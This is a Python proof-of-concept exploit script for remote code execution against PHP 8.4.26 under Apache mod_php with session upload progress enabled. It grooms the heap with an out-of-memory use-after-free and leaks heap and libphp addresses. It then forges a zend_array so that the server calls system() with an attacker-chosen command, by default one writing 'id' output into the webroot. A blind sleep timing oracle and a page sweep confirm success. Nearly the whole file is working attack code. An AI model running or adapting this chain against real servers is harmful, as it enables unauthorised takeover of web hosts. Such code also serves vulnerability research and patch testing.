#!/usr/bin/env python3
# INDEX: blind sleep timing oracle | apache | single prefork worker
"""Blind SLEEP timing oracle + calibration-free r0 sweep.

Two success-detection primitives for a forged-HashTable dispatch (ported from
78ResearchLab/PHP2Shell-Full-Chain-Exploit, exploit.py; 9bie/78ResearchLab
co-family) for targets with no output channel -- no writable webroot, no
Set-Cookie leak, display_errors off.

  (a) Blind sleep timing oracle.
      The dispatched command is `sleep N`: zif_system(sleep N) runs
      synchronously inside the stage-3 POST, so a hit blocks that one request
      ~N seconds while a miss returns in the groom's baseline time. The signal
      is the wall-clock duration of the stage-3 request against a threshold.

  (b) Calibration-free r0 sweep.
      r0 -- the chunk-base to reclaimed-page distance where the forged
      zend_array lands -- is a runtime heap-layout value that shifts with the
      memory profile. Rather than hardcode it, sweep a page-offset window
      (default 0x50000..0xC0000 step 0x1000) anchored on the leaked chunk base;
      each page is one spray request whose value packs several candidate
      low-bit reference-forges, and the first page the oracle fires on is r0.
      Only the two build-specific offsets (zif_system, zval_ptr_dtor) and the
      runtime-leaked chunk/libphp bases are needed; the filler count
      self-calibrates from the echoed leak.

Scope / constraints:
  - Target: mod_php, single prefork worker, session.upload_progress.enabled=On.
  - Built against php.net php:8.4.26-apache (zif_system=0x465370,
    zval_ptr_dtor=0x65eb60).
  - The OOM groom (huge field size, filler count) is memory-profile specific
    and bounded by max_input_vars; calibrated for memory_limit=8M (at 16M the
    filler count needed exceeds max_input_vars=1000). Match --huge-mb to the
    target's memory_limit. r0 itself is swept calibration-free.

Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import argparse
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from collections import Counter

import os  # noqa: E402
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part as _mp_part, terminator as _mp_terminator  # noqa: E402
from primitives.encode.zend_array_forge import forge_zend_array  # noqa: E402

# php:8.4.26-apache build offsets
ZIF_OFFSET = 0x465370        # zif_system
DTOR_OFFSET = 0x65EB60       # zval_ptr_dtor

PTR_MIN = 0x700000000000
PTR_MAX = 0x800000000000
MAX_CMD = 256
SID = b"attacksessionid0001"

HUGE_MB = 12                 # OOM field size; tuned for memory_limit=8M
STAGE1_FILLERS = 892
STAGE2_WINDOW = 0x20000
STAGE2_ARRAYS = 150
STAGE3_PADS = 32
HT_PAGE_OFFSET = 0x800
SPRAY_VLEN = 4071
SPRAY_COUNT = 400
SLEEP_N = 5                  # blind-oracle sleep seconds


def _mp(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        fn = p.get("filename")
        out += _mp_part(p["name"], p["data"], filename=fn,
                        ctype="application/octet-stream" if fn is not None else None,
                        boundary=boundary)
    out += _mp_terminator(boundary)
    return bytes(out)


class Target:
    def __init__(self, host, port, path="/index.php", https=False, timeout=30.0):
        self.host, self.port, self.path = host, port, path
        self.https, self.timeout = https, timeout

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None):
        hdr = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            return bytes(data)
        finally:
            s.close()

    def get(self, path, read_cap=1 << 20):
        hdr = (f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               "Connection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def _cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""


def _chunk_base(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_MIN <= v < PTR_MAX:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, n = c.most_common(1)[0]
    return base if n >= 8 else 0


def _libphp_base(raw, dtor_off):
    if len(raw) < 16:
        return 0
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_MIN <= v < PTR_MAX and (v - dtor_off) % 0x1000 == 0:
            c[v] += 1
    if not c:
        return 0
    ptr, n = c.most_common(1)[0]
    return (ptr - dtor_off) if n >= 4 else 0


class Chain:
    """Minimal OOM-UAF leak + forged-HT dispatch sufficient to drive the two
    oracle primitives."""

    def __init__(self, t, cmd, zif_off=ZIF_OFFSET, dtor_off=DTOR_OFFSET,
                 huge_mb=HUGE_MB, fillers=STAGE1_FILLERS):
        self.t = t
        self.cmd = cmd
        self.zif_off, self.dtor_off = zif_off, dtor_off
        self.huge_mb = huge_mb
        self.fillers = fillers

    def _file(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def _oom(self):
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _trigger(self, pads=STAGE3_PADS):
        parts = [{"name": "PHPSESSID", "data": b"a" * 19},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(pads):
            parts.append({"name": f"p{i:06d}"[:7], "data": b"V" * 7})
        parts += [self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)

    def rotate(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        self.t.post(_mp([{"name": "PHPSESSID", "data": SID},
                         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}],
                        b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def _leak_request(self, window, arrays):
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(self.fillers):
            parts.append({"name": str(1000 + i),
                          "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, window)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        for i in range(arrays):
            parts.append({"name": f"a{i:04d}[0]", "data": b"x"})
        return _cookie(self.t.post(_mp(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20))

    def _recalibrate(self, raw):
        m = re.fullmatch(rb"v(\d{4})x+", raw)
        if m:
            idx = int(m.group(1))
            if idx and idx != self.fillers:
                self.fillers = idx

    def leak(self, retries=3):
        """Return (chunk_base, libphp_base, raw) or (0,0,b'')."""
        self.rotate()
        chunk = 0
        for _ in range(retries):
            raw = self._leak_request(0x1000, 0)
            chunk = _chunk_base(raw)
            if chunk:
                break
            self._recalibrate(raw)
            self.rotate()
        if not chunk:
            return 0, 0, b""
        raw = self._leak_request(STAGE2_WINDOW, STAGE2_ARRAYS)
        libphp = _libphp_base(raw, self.dtor_off)
        tries = 0
        while not libphp and tries < retries:
            self.rotate()
            raw = self._leak_request(STAGE2_WINDOW, STAGE2_ARRAYS)
            libphp = _libphp_base(raw, self.dtor_off)
            tries += 1
        return chunk, libphp, raw

    def _payload(self, htdata, zif):
        cmd = self.cmd
        return forge_zend_array(htdata, zif, cmd, size=0x98 + len(cmd) + 1,
                         zero_opline=False, call_slot=6)

    def _packed_value(self, page, zif, lowbits):
        htdata = page + HT_PAGE_OFFSET
        ht = self._payload(htdata, zif)
        buf = bytearray(b"." * SPRAY_VLEN)
        for low in lowbits:
            ro = (low & 0xFFF) - 0x18
            if ro < 0 or ro + 0x20 > SPRAY_VLEN or \
               (HT_PAGE_OFFSET - 0x18) <= ro < HT_PAGE_OFFSET - 0x18 + len(ht):
                continue
            struct.pack_into("<II", buf, ro, 1, 10)
            struct.pack_into("<Q", buf, ro + 0x08, htdata)
            struct.pack_into("<Q", buf, ro + 0x10, 0x307)
            struct.pack_into("<Q", buf, ro + 0x18, 0)
        buf[HT_PAGE_OFFSET - 0x18:HT_PAGE_OFFSET - 0x18 + len(ht)] = ht
        return bytes(buf)

    def fire_page(self, chunk, zif, page_off, lowbits):
        """One stage-3 spray against page (chunk+page_off). Returns the
        wall-clock duration of the spray POST (the blind-timing signal)."""
        page = (chunk + page_off) & ~0xFFF
        val = self._packed_value(page, zif, lowbits)
        self._trigger()
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(SPRAY_COUNT):
            parts.append({"name": f"s{i:03d}", "data": val})
        d0 = time.time()
        try:
            self.t.post(_mp(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)
        except OSError:
            pass
        return time.time() - d0


# Primitive (a): blind sleep timing oracle
def sleep_threshold(baseline, sleep_n=SLEEP_N):
    """Threshold for the blind oracle: a request is a hit when its duration is
    at least baseline + sleep_n/2. The half-margin absorbs groom jitter while
    staying well under the full sleep_n block."""
    return baseline + sleep_n * 0.5


def is_hit_timing(duration, baseline, sleep_n=SLEEP_N):
    return duration >= sleep_threshold(baseline, sleep_n)


# Primitive (b): calibration-free r0 sweep
def r0_pages(r0_lo=0x50000, r0_hi=0xC0000, r0_step=0x1000):
    return list(range(r0_lo, r0_hi, r0_step))


def calibration_free_r0_sweep(chain, chunk, zif, lowbits,
                              r0_lo=0x50000, r0_hi=0xC0000, r0_step=0x1000,
                              oracle="timing", fetch_path=None,
                              sleep_n=SLEEP_N, releak_every=24, log=lambda *a: None):
    """Sweep the page window and return (r0, proof, stats) or (None, "", stats).

    oracle="timing": baseline-calibrate on a known-miss page (r0_hi region),
        then hit when a page's stage-3 duration crosses sleep_threshold.
    oracle="fetch":  hit when GET fetch_path returns 200 with a body.
    No hardcoded r0; only the leaked chunk/zif and the two binary offsets.
    """
    pages = r0_pages(r0_lo, r0_hi, r0_step)
    stats = {"tested": 0, "durations": [], "baseline": None}
    baseline = None
    if oracle == "timing":
        # Baseline on a page well outside the sweep window (guaranteed miss);
        # never mid-window where it could accidentally coincide with r0.
        baseline_page = 0x8000 if r0_lo > 0x8000 else max(0, r0_lo - 0x10000)
        baseline = chain.fire_page(chunk, zif, baseline_page, lowbits)
        stats["baseline"] = baseline
        log(f"timing baseline {baseline:.2f}s -> threshold "
            f"{sleep_threshold(baseline, sleep_n):.2f}s")
    for n, page_off in enumerate(pages, 1):
        stats["tested"] = n
        dur = chain.fire_page(chunk, zif, page_off, lowbits)
        stats["durations"].append(dur)
        if oracle == "timing":
            baseline = min(baseline, dur) if baseline else dur
            if is_hit_timing(dur, baseline, sleep_n):
                r0 = (page_off & ~0xFFF) | lowbits[0]
                return r0, (f"blind HIT: {dur:.2f}s >= "
                            f"{sleep_threshold(baseline, sleep_n):.2f}s"), stats
        else:
            time.sleep(0.5)
            st, body = chain.t.get(fetch_path)
            if st == 200 and body.strip():
                r0 = (page_off & ~0xFFF) | lowbits[0]
                return r0, body.decode("latin1", "replace").strip(), stats
        if releak_every and n % releak_every == 0:
            c2, l2, _ = chain.leak()
            if c2 and l2:
                chunk, zif = c2, l2 + chain.zif_off
    return None, "", stats


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--https", action="store_true")
    ap.add_argument("--cmd", default="id>/var/www/html/pwn.txt")
    ap.add_argument("--fetch", help="file oracle path (e.g. /pwn.txt)")
    ap.add_argument("--sleep-oracle", action="store_true",
                    help="blind timing oracle (dispatch `sleep N`, measure block)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=ZIF_OFFSET)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=DTOR_OFFSET)
    ap.add_argument("--huge-mb", type=int, default=HUGE_MB,
                    help="OOM field MiB; match target memory_limit (8M->12)")
    ap.add_argument("--fillers", type=int, default=STAGE1_FILLERS)
    ap.add_argument("--r0-lo", type=lambda x: int(x, 0), default=0x50000)
    ap.add_argument("--r0-hi", type=lambda x: int(x, 0), default=0xC0000)
    ap.add_argument("--r0-step", type=lambda x: int(x, 0), default=0x1000)
    ap.add_argument("--r0-lowbits", default="0x160,0x100,0x130,0x190")
    ap.add_argument("--timeout", type=float, default=30.0)
    a = ap.parse_args(argv)

    if not a.sleep_oracle and not a.fetch:
        ap.error("need an oracle: --fetch <path> or --sleep-oracle")
    cmd = ("sleep %d" % SLEEP_N) if a.sleep_oracle else a.cmd
    if len(cmd.encode()) > MAX_CMD:
        ap.error("command exceeds %d bytes" % MAX_CMD)
    lowbits = [int(x, 0) for x in a.r0_lowbits.split(",")]

    t = Target(a.host, a.port, path=a.path, https=a.https, timeout=a.timeout)
    chain = Chain(t, cmd.encode(), a.zif_offset, a.dtor_offset, a.huge_mb, a.fillers)

    print(f"[*] leak (chunk base + libphp base)")
    chunk, libphp, raw = chain.leak()
    if not chunk or not libphp:
        print("[!] leak failed (not single-prefork, wrong dtor offset, or "
              "huge-mb not matched to memory_limit)", file=sys.stderr)
        return 1
    zif = libphp + a.zif_offset
    print(f"[+] chunk={chunk:#x} libphp={libphp:#x} zif_system={zif:#x} "
          f"fillers={chain.fillers}")

    r0, proof, stats = calibration_free_r0_sweep(
        chain, chunk, zif, lowbits, a.r0_lo, a.r0_hi, a.r0_step,
        oracle="timing" if a.sleep_oracle else "fetch", fetch_path=a.fetch,
        log=lambda s: print("    " + s))
    if r0 is None:
        print(f"[!] no r0 in range after {stats['tested']} pages; widen the window",
              file=sys.stderr)
        return 1
    print(f"[+] RCE  r0={r0:#x}  (page {stats['tested']} of sweep)")
    print(f"[+] PROOF: {proof}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
